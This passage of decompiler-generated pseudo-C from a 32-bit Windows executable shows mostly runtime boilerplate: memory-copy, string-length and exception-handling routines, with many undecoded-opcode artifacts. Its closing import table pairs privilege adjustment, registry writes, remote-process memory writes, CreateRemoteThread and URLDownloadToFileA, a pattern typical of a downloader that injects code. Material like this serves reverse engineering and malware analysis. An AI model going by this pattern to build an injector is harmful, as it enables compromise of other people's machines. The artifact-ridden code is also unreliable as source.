        ecx = ecx >> 2;
        *(edi + 2) = al;
        esi = esi + 3;
        edi = edi + 3;
        if(ecx < 8) {
            goto L13142174;
        }
        asm("rep movsd");
        goto *(edx * 4 + 0x13142264)[L13142274, L1314227c, L13142288, L1314229c, ]goto ( *(edx * 4 + 0x13142264));
        edx = edx & ecx;
        al = *esi;
        *edi = al;
        al = *(esi + 1);
        ecx = ecx >> 2;
        *(edi + 1) = al;
        esi = esi + 2;
        edi = edi + 2;
        if(ecx < 8) {
            goto L13142174;
        }
        asm("rep movsd");
        goto *(edx * 4 + 0x13142264)[L13142274, L1314227c, L13142288, L1314229c, ]goto ( *(edx * 4 + 0x13142264));
        edx = edx & ecx;
        al = *esi;
        *edi = al;
        esi = esi + 1;
        ecx = ecx >> 2;
        edi = edi + 1;
        if(ecx < 8) {
            goto L13142174;
        }
        asm("rep movsd");
        goto *(edx * 4 + 0x13142264)[L13142274, L1314227c, L13142288, L1314229c, ]goto ( *(edx * 4 + 0x13142264));
        eax = *(esi + ecx * 4 - 28);
        *(edi + ecx * 4 - 28) = eax;
        eax = *(esi + ecx * 4 - 24);
        *(edi + ecx * 4 - 24) = eax;
        eax = *(esi + ecx * 4 - 20);
        *(edi + ecx * 4 - 20) = eax;
        eax = *(esi + ecx * 4 - 16);
        *(edi + ecx * 4 - 16) = eax;
        eax = *(esi + ecx * 4 - 12);
        *(edi + ecx * 4 - 12) = eax;
        eax = *(esi + ecx * 4 - 8);
        *(edi + ecx * 4 - 8) = eax;
        eax = *(esi + ecx * 4 - 4);
        *(edi + ecx * 4 - 4) = eax;
        eax = ecx * 4;
        esi = esi + eax;
        edi = edi + eax;
        goto *(edx * 4 + 0x13142264)[L13142274, L1314227c, L13142288, L1314229c, ]goto ( *(edx * 4 + 0x13142264));
        return(A8);
        al = *esi;
        *edi = al;
        esp = ebp;
        return(A8);
        al = *esi;
        *edi = al;
        al = *(esi + 1);
        *(edi + 1) = al;
        esp = ebp;
        return(A8);
        al = *esi;
        *edi = al;
        al = *(esi + 1);
        *(edi + 1) = al;
        al = *(esi + 2);
        *(edi + 2) = al;
        esp = ebp;
        return(A8);
    }
    esi = ecx + esi - 4;
    edi = ecx + edi - 4;
    if(!(edi & 3)) {
        ecx = ecx >> 2;
        edx = edx & 3;
        if(ecx >= 8) {
            asm("std");
            asm("rep movsd");
            asm("cld");
            goto *(edx * 4 + 0x13142400)[L13142410, L13142418, L13142428, L1314243c, ]goto ( *(edx * 4 + 0x13142400));
        }
L131422dc:
        ecx = ~ecx;
        goto *(ecx * 4 + 0x131423b0)[L131423f7, ]goto ( *(ecx * 4 + 0x131423b0));
    }
    eax = edi;
    edx = 3;
    if(ecx >= 4) {
        ecx = ecx - (eax & 3);
        goto ( *(eax * 4 + 0x13142304));
    }
    goto *(ecx * 4 + 0x13142400)[L13142410, L13142418, L13142428, L1314243c, ]goto ( *(ecx * 4 + 0x13142400));
    asm("adc al,0x23");
    asm("adc al,0x13");
    *ebx :: ah;
    asm("adc al,0x13");
    asm("pusha");
    edx = edx & *(ebx + edx);
    al = *(esi + 3);
    edx = edx & ecx;
    *(edi + 3) = al;
    esi = esi - 1;
    ecx = ecx >> 2;
    edi = edi - 1;
    if(ecx < 8) {
        goto L131422dc;
    }
    asm("std");
    asm("rep movsd");
    asm("cld");
    goto *(edx * 4 + 0x13142400)[L13142410, L13142418, L13142428, L1314243c, ]goto ( *(edx * 4 + 0x13142400));
    al = *(esi + 3);
    edx = edx & ecx;
    *(edi + 3) = al;
    al = *(esi + 2);
    ecx = ecx >> 2;
    *(edi + 2) = al;
    esi = esi - 2;
    edi = edi - 2;
    if(ecx < 8) {
        goto L131422dc;
    }
    asm("std");
    asm("rep movsd");
    asm("cld");
    goto *(edx * 4 + 0x13142400)[L13142410, L13142418, L13142428, L1314243c, ]goto ( *(edx * 4 + 0x13142400));
    al = *(esi + 3);
    edx = edx & ecx;
    *(edi + 3) = al;
    al = *(esi + 2);
    *(edi + 2) = al;
    al = *(esi + 1);
    ecx = ecx >> 2;
    *(edi + 1) = al;
    esi = esi - 3;
    edi = edi - 3;
    if(ecx < 8) {
        goto L131422dc;
    }
    asm("std");
    asm("rep movsd");
    asm("cld");
    goto *(edx * 4 + 0x13142400)[L13142410, L13142418, L13142428, L1314243c, ]goto ( *(edx * 4 + 0x13142400));
    ah = 35;
    asm("adc al,0x13");
    esp = -1005382621;
    edx = edx & *(ebx + edx);
    asm("int3");
    edx = edx & *(ebx + edx);
    asm("aam 0x23");
    asm("adc al,0x13");
    (fsave)(frestore) - *ebx;
    asm("adc al,0x13");
    asm("in al,0x23");
    asm("adc al,0x13");
    *(edi + ecx * 4 + 28) = *(esi + ecx * 4 + 28);
    *(edi + ecx * 4 + 24) = *(esi + ecx * 4 + 24);
    *(edi + ecx * 4 + 20) = *(esi + ecx * 4 + 20);
    *(edi + ecx * 4 + 16) = *(esi + ecx * 4 + 16);
    *(edi + ecx * 4 + 12) = *(esi + ecx * 4 + 12);
    *(edi + ecx * 4 + 8) = *(esi + ecx * 4 + 8);
    *(edi + ecx * 4 + 4) = *(esi + ecx * 4 + 4);
    eax = ecx * 4;
    esi = esi + eax;
    edi = edi + eax;
    goto *(edx * 4 + 0x13142400)[L13142410, L13142418, L13142428, L1314243c, ]goto ( *(edx * 4 + 0x13142400));
    esp = ebp;
    return(A8);
    *(edi + 3) = *(esi + 3);
    esp = ebp;
    return(A8);
    *(edi + 3) = *(esi + 3);
    *(edi + 2) = *(esi + 2);
    esp = ebp;
    return(A8);
    *(edi + 3) = *(esi + 3);
    *(edi + 2) = *(esi + 2);
    *(edi + 1) = *(esi + 1);
    esp = ebp;
    return(A8);
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
}

stack space not deallocated on return
/*	Procedure: 0x13142460 - 0x131425EE
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L13142460(A4)
/* unknown */ void  A4;
{



    ecx = A4;
    if(!(ecx & 3)) {
        do {
            al = *ecx;
            ecx = ecx + 1;
            if(al == 0) {
                goto L131424c3;
            }
        } while(ecx & 3);
    }
    while(1) {
        eax = *ecx;
        edx = 2130640639 + eax;
        eax = eax ^ -1 ^ edx;
        ecx = ecx + 4;
        if(eax & -2130640640) {
            continue;
        }
        eax = *(ecx - 4);
        if(al == 0) {
            goto L131424e1;
        }
        if(ah == 0) {
            goto L131424d7;
        }
        if(eax & 16711680) {
            goto L131424cd;
        }
        if(eax & -16777216) {
            break;
        }
    }
L131424c3:
    eax = ecx - 1;
    ecx = A4;
    return(eax - ecx);
L131424cd:
    eax = ecx - 2;
    ecx = A4;
    return(eax - ecx);
L131424d7:
    eax = ecx - 3;
    ecx = A4;
    return(eax - ecx);
L131424e1:
    eax = ecx - 4;
    ecx = A4;
    return(eax - ecx);
    (save)ebp;
    ebp = esp;
    esp = esp - 808;
    *L13144150 = eax;
    *L1314414C = ecx;
    *L13144148 = edx;
    *L13144144 = ebx;
    *L13144140 = esi;
    *L1314413C = edi;
    *L13144168 = ss;
    *L1314415C = cs;
    *L13144138 = ds;
    *L13144134 = es;
    *L13144130 = fs;
    *L1314412C = gs;
    asm("pushf");
    (restore) *L13144160;
    *L13144154 = *ebp;
    *L13144158 = *(ebp + 4);
    *L13144164 = ebp + 8;
    eax = *(ebp + -800);
    *L131440A0 = 65537;
    *L13144054 = *L13144158;
    *L13144048 = -1073740791;
    *L1314404C = 1;
    *(ebp + -808) = *L13144000;
    *(ebp + -804) = *L13144004;
    *L13144098 = *__imp__IsDebuggerPresent();
    L1314276D(1);
    (save)0;
    *__imp__SetUnhandledExceptionFilter();
    (save)0x131412d8;
    *__imp__UnhandledExceptionFilter();
    if(*L13144098 == 0) {
        L1314276D(1);
    }
    (restore)ebp;
    return(*__imp__TerminateProcess( *__imp__GetCurrentProcess(), -1073740791));
}

/*	Procedure: 0x131425EF - 0x13142675
 *	Argument size: 4
 *	Local size: 8
 *	Save regs size: 0
 */

L131425EF(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    Vfffffffc = edi;
    Vfffffff8 = esi;
    esi = Ac;
    edi = A8;
    ecx = A10 >> 7;
    do {
        asm("o16 movq mm0,[esi]");
        asm("o16 movq mm1,[esi+0x10]");
        asm("o16 movq mm2,[esi+0x20]");
        asm("o16 movq mm3,[esi+0x30]");
        asm("o16 movq [edi],mm0");
        asm("o16 movq [edi+0x10],mm1");
        asm("o16 movq [edi+0x20],mm2");
        asm("o16 movq [edi+0x30],mm3");
        asm("o16 movq mm4,[esi+0x40]");
        asm("o16 movq mm5,[esi+0x50]");
        asm("o16 movq mm6,[esi+0x60]");
        asm("o16 movq mm7,[esi+0x70]");
        asm("o16 movq [edi+0x40],mm4");
        asm("o16 movq [edi+0x50],mm5");
        asm("o16 movq [edi+0x60],mm6");
        asm("o16 movq [edi+0x70],mm7");
        esi = esi + 128;
        edi = edi + 128;
    } while(ecx = ecx - 1);
    esi = Vfffffff8;
    edi = Vfffffffc;
}

/*	Procedure: 0x13142676 - 0x13142758
 *	Argument size: -16
 *	Local size: 28
 *	Save regs size: 0
 */

L13142676(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{
	/* unknown */ void  Vffffffe4;
	/* unknown */ void  Vffffffe8;
	/* unknown */ void  Vffffffec;
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    Vfffffff4 = edi;
    Vfffffff8 = esi;
    Vfffffffc = ebx;
    ebx = Ac;
    eax = ebx;
    asm("cdq");
    ecx = eax;
    eax = A8;
    ecx = ((ecx ^ edx) - edx & 15 ^ edx) - edx;
    asm("cdq");
    edi = ((eax ^ edx) - edx & 15 ^ edx) - edx;
    if(!(edx = ecx | edi)) {
        esi = A10;
        ecx = esi & 127;
        Vffffffe8 = ecx;
        if(esi != ecx) {
            (save)esi - ecx;
            (save)ebx;
            L131425EF(eax);
            eax = A8;
            ecx = Vffffffe8;
        }
        if(ecx != 0) {
            ebx = A10;
            Vffffffec = Ac + ebx - ecx;
            Vfffffff0 = ebx + eax - ecx;
            esi = Vffffffec;
            edi = Vfffffff0;
            ecx = Vffffffe8;
            asm("rep movsb");
            eax = A8;
        }
    } else {
        if(ecx == edi) {
            Vffffffe4 = ~ecx + 16;
            esi = Ac;
            edi = A8;
            ecx = Vffffffe4;
            asm("rep movsb");
            L13142676(A8 + Vffffffe4, Ac + Vffffffe4, A10 - Vffffffe4);
            eax = A8;
        } else {
            esi = Ac;
            edi = A8;
            ecx = A10;
            edx = ecx;
            ecx = ecx >> 2;
            asm("rep movsd");
            ecx = edx & 3;
            asm("rep movsb");
            eax = A8;
        }
    }
    ebx = Vfffffffc;
    esi = Vfffffff8;
    edi = Vfffffff4;
}

/*	Procedure: 0x13142759 - 0x1314276C
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L13142759()
{



    *L13144374 = 0;
    *L13144374 = L131427C5();
    return(0);
}

/*	Procedure: 0x1314276D - 0x13142774
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L1314276D()
{



    *L13144370 = 0;
}

stack space not deallocated on return
/*	Procedure: 0x13142775 - 0x131427C4
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L13142775()
{



    L13142834(0x13142da0, 12);
    *(ebp - 4) = 0;
    asm("Unknown opcode 0x66");
    asm("Unknown opcode 0x0f");
    cl = cl - al;
    *(ebp - 28) = 1;
    goto L131427b5;
    eax = *( *( *(ebp - 20)));
    if(eax != -1073741819 && eax != -1073741795) {
        return(0);
    }
    return(1);
    esp = *(ebp - 24);
    *(ebp - 28) = 0;
L131427b5:
    *(ebp - 4) = -2;
    eax = *(ebp - 28);
    return(L13142879());
}

/*	Procedure: 0x131427C5 - 0x13142824
 *	Argument size: 0
 *	Local size: 24
 *	Save regs size: 4
 */

L131427C5()
{
	/* unknown */ void  ebx;
	/* unknown */ void  Vffffffe8;
	/* unknown */ void  Vffffffec;
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    Vfffffffc = 0;
    Vfffffff4 = 0;
    Vfffffff8 = 0;
    (save)ebx;
    asm("pushf");
    (restore)eax;
    ecx = eax;
    (save)eax ^ 2097152;
    asm("popf");
    asm("pushf");
    (restore)edx;
    if(!(edx = edx - ecx)) {
        (save)ecx;
        asm("popf");
        eax = 0;
        asm("cpuid");
        Vfffffff4 = eax;
        Vffffffe8 = ebx;
        Vffffffec = edx;
        Vfffffff0 = ecx;
        eax = 1;
        asm("cpuid");
        Vfffffffc = edx;
        Vfffffff8 = eax;
    }
    (restore)ebx;
    if(!(Vfffffffc & 67108864)) {
        if(L13142775() == 0) {
            goto L13142820;
        }
        eax = 1;
    } else {
L13142820:
        eax = 0;
    }
}

/*	Procedure: 0x13142825 - 0x13142831
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L13142825()
{



    *L13144378 = L131427C5();
    return(0);
}

/*	Procedure: 0x13142832 - 0x13142833
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L13142832()
{



    asm("int3");
    asm("int3");
}

stack space not deallocated on return
/*	Procedure: 0x13142834 - 0x13142878
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L13142834(A10)
/* unknown */ void  A10;
{



    (save)0x13142890;
    (save) *%fs:0x0];
    eax = A10;
    A10 = ebp;
    ebp = & A10;
    esp = esp - eax;
    (save)ebx;
    (save)esi;
    (save)edi;
    eax = *L13144000;
    *(ebp - 4) = *(ebp - 4) ^ eax;
    (save)eax ^ ebp;
    *(ebp - 24) = esp;
    (save) *(ebp - 8);
    eax = *(ebp - 4);
    *(ebp - 4) = -2;
    *(ebp - 8) = eax;
    eax = ebp - 16;
    *%fs:0x0] = eax;
    return(*%fs:0x0]);
}

stack space not deallocated on return
/*	Procedure: 0x13142879 - 0x1314288C
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L13142879()
{



    *%fs:0x0] = *(ebp - 16);
    (restore)ecx;
    (restore)edi;
    (restore)edi;
    (restore)esi;
    (restore)ebx;
    esp = ebp;
    (restore)ebp;
    (save)ecx;
}

/* DEST BLOCK NOT FOUND: 13142a00 -> 13142b31 */
/*	Procedure: 0x1314288D - 0x13142A27
 *	Argument size: 12
 *	Local size: 0
 *	Save regs size: 0
 */

L1314288D(A4, A8, Ac)
/* unknown */ void  A4;
/* unknown */ void  A8;
/* unknown */ void  Ac;
{
	/* unknown */ void  Vffffffef;
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    asm("int3");
    asm("int3");
    asm("int3");
    esp = esp - 20;
    (save)ebx;
    ebx = A8;
    (save)ebp;
    (save)esi;
    esi = *(ebx + 8) ^ *L13144000;
    (save)edi;
    eax = *esi;
    eax :: -2;
    Vffffffef = 0;
    Vfffffff4 = 1;
    if(!(edi = ebx + 16)) {
        ecx = *(esi + 4) + edi ^ *(eax + edi);
        L131420E0();
    }
    ecx = *(esi + 12);
    eax = *(esi + 8);
    ecx = ecx + edi ^ *(eax + edi);
    L131420E0();
    eax = A4;
    if(!( *(eax + 4) & 102)) {
        ebp = *(ebx + 12);
        Vfffffff8 = eax;
        Vfffffffc = Ac;
        *(ebx - 4) = & Vfffffff8;
        if(ebp != -2) {
L13142901:
            eax = ebp + ebp * 2;
            *(esi + eax * 4 + 20) :: 0;
            eax = *ebx;
            Vfffffff0 = eax;
            if(!(ebx = esi + eax * 4 + 16)) {
                edx = edi;
                Vffffffef = 1;
                if(L13142B1A() < 0) {
                    goto L1314296b;
                }
                > ? L13142975 : ;
                eax = Vfffffff0;
            }
            ebp = eax;
            if(eax != -2) {
                goto L13142901;
            }
            if(Vffffffef != 0) {
L1314293b:
                eax = *esi;
                if(eax != -2) {
                    ecx = *(esi + 4) + edi ^ *(eax + edi);
                    L131420E0();
                }
                ecx = *(esi + 12);
                eax = *(esi + 8);
                ecx = ecx + edi ^ *(eax + edi);
                L131420E0();
            }
        }
L1314295f:
        (restore)edi;
        (restore)esi;
        (restore)ebp;
        (restore)ebx;
        esp = esp + 20;
        return(Vfffffff4);
L1314296b:
        Vfffffff4 = 0;
        goto L1314293b;
        if(*A4 == -529697949 && *L1314436C != 0 && L13142BF2(320095084) != 0) {
            *L1314436c(A4, 1);
        }
        ecx = A8;
        L13142B4A();
        eax = A8;
        if(*(eax + 12) != ebp) {
            edx = ebp;
            ecx = eax;
            L13142B64(edi, 0x13144000);
            eax = A8;
        }
        *(eax + 12) = Vfffffff0;
        eax = *esi;
        if(eax != -2) {
            ecx = *(esi + 4) + edi ^ *(eax + edi);
            L131420E0();
        }
        ecx = *(esi + 12);
        edx = *(esi + 8);
        ecx = ecx + edi ^ *(edx + edi);
        L131420E0();
        ecx = *(ebx + 8);
        edx = edi;
        goto L13142b31;
    }
    if(*(ebx + 12) == -2) {
        goto L1314295f;
    }
    ecx = ebx;
    edx = -2;
    L13142B64(edi, 0x13144000);
    goto L1314293b;
    asm("int3");
    asm("int3");
}

stack space not deallocated on return
/*	Procedure: 0x13142A28 - 0x13142B19
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L13142A28(A4, A8, A10, A14, A18, A2c, A30, A34)
/* unknown */ void  A4;
/* unknown */ void  A8;
/* unknown */ void  A10;
/* unknown */ void  A14;
/* unknown */ void  A18;
/* unknown */ void  A2c;
/* unknown */ void  A30;
/* unknown */ void  A34;
{



    (save)ebx;
    (save)esi;
    (save)edi;
    ecx = A18;
    (save)ebp;
    (save)A10;
    (save)A14;
    (save)ecx;
    (save)ecx;
    (save)0x13142ab8;
    (save) *%fs:0x0];
    A8 = *L13144000 ^ esp;
    for(*%fs:0x0] = esp; 1; L13142D94()) {
        eax = A30;
        ebx = *(eax + 8);
        ebx = ebx ^ *A2c;
        esi = *(eax + 12);
        if(esi == -2 || A34 != -2 && esi <= A34) {
            break;
        }
        ebx = ebx + (esi + esi * 2) * 4 + 16;
        *(eax + 12) = *ebx;
        if(*(ebx + 4) != 0) {
            continue;
        }
        eax = *(ebx + 8);
        L13142D75(257);
        ecx = 1;
        eax = *(ebx + 8);
    }
    (restore) *%fs:0x0];
    esp = esp + 24;
    (restore)edi;
    (restore)esi;
    (restore)ebx;
    return;
    eax = 1;
    if(!( *(A4 + 4) & 6)) {
        eax = A8;
        ecx = *(eax + 8) ^ eax;
        eax = L131420E0();
        (save)ebp;
        ebp = *(eax + 24);
        (save) *(eax + 12);
        (save) *(eax + 16);
        L13142A28( *(eax + 20));
        esp = esp + 12;
        (restore)ebp;
        *A10 = A8;
        eax = 3;
    }
    return;
    (save)ebp;
    ecx = A8;
    ebp = *ecx;
    (save) *(ecx + 28);
    (save) *(ecx + 24);
    eax = L13142A28( *(ecx + 40));
    esp = esp + 12;
    (restore)ebp;
}

/* DEST BLOCK NOT FOUND: 13142b48 -> 13142d75 */
/*	Procedure: 0x13142B1A - 0x13142B49
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 16
 */

L13142B1A()
{
	/* unknown */ void  ebx;
	/* unknown */ void  ebp;
	/* unknown */ void  esi;
	/* unknown */ void  edi;



    ebp = edx;
    eax = 0;
    ebx = 0;
    edx = 0;
    esi = 0;
    edi = 0;
    return(*ecx());
    ebp = edx;
    esi = ecx;
    eax = ecx;
    L13142D75(1);
    eax = 0;
    ebx = 0;
    ecx = 0;
    edx = 0;
    edi = 0;
    goto ( *esi);
}

/*	Procedure: 0x13142B4A - 0x13142B63
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 12
 */

L13142B4A()
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;



    return(RtlUnwind(ecx, 0x13142b5f, 0, 0));
}

stack space not deallocated on return
/*	Procedure: 0x13142B64 - 0x13142B7F
 *	Argument size: 8
 *	Local size: 0
 *	Save regs size: 4
 */

L13142B64(Ac, A18)
/* unknown */ void  Ac;
/* unknown */ void  A18;
{



    (save)edx;
    (save)ecx;
    esp = esp + 12;
    return(L13142A28(A18));
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
}

/*	Procedure: 0x13142B80 - 0x13142BAF
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L13142B80(A4)
/* unknown */ void  A4;
{



    if(*A4 != 23117) {
L13142b8b:
        return(0);
    }
    eax = *(A4 + 60) + A4;
    if(*eax != 17744) {
        goto L13142b8b;
    }
    return(0 & 255);
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
}

/*	Procedure: 0x13142BB0 - 0x13142BF1
 *	Argument size: 8
 *	Local size: 0
 *	Save regs size: 0
 */

L13142BB0(A4, A8)
/* unknown */ void  A4;
/* unknown */ void  A8;
{



    eax = A4;
    ecx = *(eax + 60) + eax;
    eax = *(ecx + 20) & 65535;
    (save)ebx;
    (save)esi;
    esi = *(ecx + 6) & 65535;
    edx = 0;
    esi :: 0;
    (save)A8;
    if(!(eax = eax + ecx + 24)) {
        do {
            ecx = *(eax + 12);
            if(A8 >= ecx && A8 < *(eax + 8) + ecx) {
                goto L13142bee;
            }
            edx = edx + 1;
            eax = eax + 40;
        } while(edx < esi);
    }
    eax = 0;
L13142bee:
    (restore)A8;
    (restore)esi;
    (restore)ebx;
}

/* DEST BLOCK NOT FOUND: 13142c90 -> 13142cc4 */
stack space not deallocated on return
/*	Procedure: 0x13142BF2 - 0x13142CC4
 *	Argument size: 20
 *	Local size: 0
 *	Save regs size: 0
 */

L13142BF2(A4, A8, A10, A14)
/* unknown */ void  A4;
/* unknown */ void  A8;
/* unknown */ void  A10;
/* unknown */ void  A14;
{



    (save)8;
    L13142834(0x13142dc0);
    *(ebp - 4) = 0;
    if(L13142B80(320077824) != 0) {
        eax = L13142BB0(edx, *(ebp + 8) - edx);
        if(eax != 0) {
            eax = !( *(eax + 36) >> 31) & 1;
            *(ebp - 4) = -2;
            goto L13142c58;
            eax = *( *( *(ebp - 20)));
            return(0 & 255);
            esp = *(ebp - 24);
        }
    }
    *(ebp - 4) = -2;
    eax = 0;
L13142c58:
    return(L13142879());
    asm("int3");
    asm("int3");
    ebp = esp;
    eax = RtlUnwind( *(ebp + 8), 0x13142c78, 0, 0, ebp, edi, esi, ebx, ebp);
    (restore)ebp;
    (restore)edi;
    (restore)esi;
    (restore)ebx;
    (restore)ebp;
    return;
    eax = 1;
    if(!( *(A4 + 4) & 6)) {
        eax = A14;
        ecx = *(eax - 4) ^ eax;
        eax = L131420E0();
        (save)ebp;
        ebp = *(eax + 16);
        L13142CC5( *(eax + 36), *(eax + 40));
        (restore)ebp;
        *A10 = A8;
        eax = 3;
    }
}

/* DEST BLOCK NOT FOUND: 13142d73 -> 13142d80 */
/*	Procedure: 0x13142CC5 - 0x13142D74
 *	Argument size: 8
 *	Local size: 0
 *	Save regs size: 0
 */

L13142CC5(A4, A8)
/* unknown */ void  A4;
/* unknown */ void  A8;
{
	/* unknown */ void  Vffffffe0;
	/* unknown */ void  Vffffffe8;



    (save)ebx;
    (save)esi;
    (save)edi;
    (save)ebp;
    (save)A4;
    (save)-2;
    (save)0x13142c80;
    (save) *%fs:0x0];
    (save) *L13144000 ^ esp;
    *%fs:0x0] = & Vffffffe0;
L13142cee:
    eax = A4;
    ebx = *(eax + 8);
    esi = *(eax + 12);
    if(esi != -1 && (A8 == -1 || esi > A8)) {
        esi = esi + esi * 2;
        ecx = *(ebx + esi * 4);
        Vffffffe8 = ecx;
        *(eax + 12) = Vffffffe8;
        if(*(ebx + esi * 4 + 4) == 0) {
            eax = *(ebx + esi * 4 + 8);
            L13142D75(257);
            eax = *(ebx + esi * 4 + 8);
            L13142D94();
        }
        goto L13142cee;
    }
    *%fs:0x0] = Vffffffe0;
    esp = esp + 24;
    (restore)edi;
    (restore)esi;
    (restore)ebx;
    return;
    eax = 0;
    ecx = *%fs:0x0];
    if(*(ecx + 4) == 0x13142c80 && *(ecx + 8) == *( *(ecx + 12) + 12)) {
        eax = 1;
    }
    return;
    (save)ebx;
    (save)ecx;
    ebx = 0x13144010;
    goto L13142d80;
}

/*	Procedure: 0x13142D75 - 0x13142D93
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 8
 */

L13142D75(Ac)
/* unknown */ void  Ac;
{
	/* unknown */ void  ebx;



    ebx = 0x13144010;
    *(ebx + 8) = Ac;
    *(ebx + 4) = eax;
    *(ebx + 12) = ebp;
    (save)ebp;
    (save)Ac;
    eax = eax;
    (restore)Ac;
    (restore)ebp;
}

/*	Procedure: 0x13142D94 - 0x13142D97
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L13142D94()
{



    return(*eax());
    asm("int3");
}

/* DEST BLOCK NOT FOUND: 13142d98 -> 13142d80 */
/*	Procedure: 0x13142D98 - 0x13142DDB
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

RtlUnwind()
{



    goto ( *__imp__RtlUnwind);
    asm("int3");
    asm("int3");
    asm("Unknown opcode 0xfe");
    asm("Unknown opcode 0xff");
    asm("Unknown opcode 0xff");
    *eax = *eax + 1;
    *eax = *eax + al;
    ah = ah + dl;
    asm("Unknown opcode 0xff");
    asm("Unknown opcode 0xff");
    *eax = *eax + 1;
    *eax = *eax + al;
    dh = dh + bh;
    asm("Unknown opcode 0xff");
    asm("Unknown opcode 0xff");
    eax = *(edx + -1374481369)();
    asm("daa");
    asm("adc al,0x13");
    *eax = *eax + al;
    *eax = *eax + al;
    asm("Unknown opcode 0xfe");
    asm("Unknown opcode 0xff");
    asm("Unknown opcode 0xff");
    *eax = *eax + 1;
    *eax = *eax + al;
    al = al + bl;
    asm("Unknown opcode 0xff");
    asm("Unknown opcode 0xff");
    *eax = *eax + 1;
    *eax = *eax + al;
    dh = dh + bh;
    asm("Unknown opcode 0xff");
    asm("Unknown opcode 0xff");
    asm("Unknown opcode 0xff");
    *(esp + edx) :: ch;
    asm("adc ecx,[esp+ebp+0x14]");
    asm("adc ecx,[esp+ebp+0x14]");
}

/* address  size  */
/* 0x13141000       0 */ /* unknown */ void 	__imp__LookupPrivilegeValueA;
/* 0x13141004       0 */ /* unknown */ void 	__imp__AdjustTokenPrivileges;
/* 0x13141008       0 */ /* unknown */ void 	__imp__RegCreateKeyExA;
/* 0x1314100c       0 */ /* unknown */ void 	__imp__RegSetValueExA;
/* 0x13141010       0 */ /* unknown */ void 	__imp__RegCloseKey;
/* 0x13141014       0 */ /* unknown */ void 	__imp__GetSecurityInfo;
/* 0x13141018       0 */ /* unknown */ void 	__imp__GetUserNameA;
/* 0x1314101c       0 */ /* unknown */ void 	__imp__SetEntriesInAclA;
/* 0x13141020       0 */ /* unknown */ void 	__imp__SetSecurityInfo;
/* 0x13141024       0 */ /* unknown */ void 	__imp__OpenProcessToken;
/* 0x1314102c       0 */ /* unknown */ void 	__imp__HeapAlloc;
/* 0x13141030       0 */ /* unknown */ void 	__imp__GetProcessHeap;
/* 0x13141034       0 */ /* unknown */ void 	__imp__GetFileInformationByHandle;
/* 0x13141038       0 */ /* unknown */ void 	__imp__CreateFileA;
/* 0x1314103c       0 */ /* unknown */ void 	__imp__lstrcatA;
/* 0x13141040       0 */ /* unknown */ void 	__imp__GetSystemDirectoryA;
/* 0x13141044       0 */ /* unknown */ void 	__imp__GetProcAddress;
/* 0x13141048       0 */ /* unknown */ void 	__imp__ReadFile;
/* 0x1314104c       0 */ /* unknown */ void 	__imp__LoadLibraryA;
/* 0x13141050       0 */ /* unknown */ void 	__imp__GetCurrentProcess;
/* 0x13141054       0 */ /* unknown */ void 	__imp__IsBadReadPtr;
/* 0x13141058       0 */ /* unknown */ void 	__imp__GetVersionExA;
/* 0x1314105c       0 */ /* unknown */ void 	__imp__OpenProcess;
/* 0x13141060       0 */ /* unknown */ void 	__imp__HeapFree;
/* 0x13141064       0 */ /* unknown */ void 	__imp__GetModuleHandleA;
/* 0x13141068       0 */ /* unknown */ void 	__imp__VirtualAllocEx;
/* 0x1314106c       0 */ /* unknown */ void 	__imp__WriteProcessMemory;
/* 0x13141070       0 */ /* unknown */ void 	__imp__CreateRemoteThread;
/* 0x13141074       0 */ /* unknown */ void 	__imp__CreateToolhelp32Snapshot;
/* 0x13141078       0 */ /* unknown */ void 	__imp__Process32First;
/* 0x1314107c       0 */ /* unknown */ void 	__imp__CloseHandle;
/* 0x13141080       0 */ /* unknown */ void 	__imp__lstrcmpiA;
/* 0x13141084       0 */ /* unknown */ void 	__imp__LocalFree;
/* 0x13141088       0 */ /* unknown */ void 	__imp__Process32Next;
/* 0x1314108c       0 */ /* unknown */ void 	__imp__IsDebuggerPresent;
/* 0x13141090       0 */ /* unknown */ void 	__imp__SetUnhandledExceptionFilter;
/* 0x13141094       0 */ /* unknown */ void 	__imp__TerminateProcess;
/* 0x13141098       0 */ /* unknown */ void 	__imp__UnhandledExceptionFilter;
/* 0x1314109c       0 */ /* unknown */ void 	__imp__RtlUnwind;
/* 0x131410a4       0 */ /* unknown */ void 	__imp__URLDownloadToFileA;
/* 0x13142093       0 */ /* unknown */ void 	__entry_point__;
/* 0x131420c8       0 */ /* unknown */ void 	Process32Next;
/* 0x131420ce       0 */ /* unknown */ void 	Process32First;
